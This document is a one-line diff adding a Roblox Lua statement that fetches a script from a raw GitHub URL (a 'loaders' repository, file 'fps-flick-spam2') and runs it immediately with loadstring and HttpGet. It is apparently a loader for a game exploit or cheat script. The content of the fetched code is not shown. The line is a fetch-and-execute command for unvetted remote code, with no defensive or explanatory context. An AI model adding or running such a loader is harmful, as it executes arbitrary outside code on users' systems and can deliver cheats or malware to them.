@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/fps-flick-spam2-ysx6amf0gv8hro.lua"))()
